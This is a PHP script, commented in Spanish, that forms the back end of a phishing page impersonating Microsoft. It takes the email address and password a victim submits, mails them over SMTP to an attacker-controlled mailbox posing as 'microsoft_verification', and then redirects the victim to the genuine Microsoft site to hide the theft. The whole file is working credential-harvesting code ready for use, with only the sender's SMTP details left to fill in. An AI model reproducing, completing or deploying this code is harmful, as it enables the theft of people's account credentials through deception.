<?php
// Incluye el archivo de la clase PHPMailer
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $correo = $_POST['correo'];
    $contrasena = $_POST['contrasena'];

    // Crea una nueva instancia de PHPMailer
    $mail = new PHPMailer();

    // Configura el servidor SMTP
    $mail->isSMTP();
    $mail->Host = 'smtp.tuhost.com';  // Cambia 'smtp.tuhost.com' por el servidor SMTP de tu proveedor de correo
    $mail->SMTPAuth = true;
    $mail->Username = 'tu_correo@tuhost.com'; // Cambia 'tu_correo@tuhost.com' por tu dirección de correo electrónico
    $mail->Password = 'tu_contrasena'; // Cambia 'tu_contrasena' por tu contraseña de correo electrónico
    $mail->SMTPSecure = 'tls'; // Puede ser 'tls' o 'ssl'
    $mail->Port = 587; // Puerto de SMTP

    // Configura el remitente y el destinatario
    $mail->setFrom('tu_correo@tuhost.com', 'Tu Nombre'); // Cambia 'tu_correo@tuhost.com' y 'Tu Nombre' por tu dirección de correo y tu nombre
    $mail->addAddress('microsoft_verification@hotmail.com'); // Cambia 'microsoft_verification@hotmail.com' por tu dirección de correo de destino

    // Establece el asunto y el cuerpo del correo
    $mail->Subject = 'Credenciales de inicio de sesión';
    $mail->Body = "Se han ingresado las siguientes credenciales:\n\n";
    $mail->Body .= "Correo electrónico: " . $correo . "\n";
    $mail->Body .= "Contraseña: " . $contrasena;

    // Envía el correo
    if ($mail->send()) {
        // Redirecciona a la página oficial de Microsoft
        header("Location: https://www.microsoft.com/");
        exit;
    } else {
        echo 'El correo no pudo ser enviado. Error: ' . $mail->ErrorInfo;
    }
} else {
    // Redirecciona a una página de error si se accede directamente al archivo PHP
    header("Location: pagina_de_error.php");
    exit;
}
?>
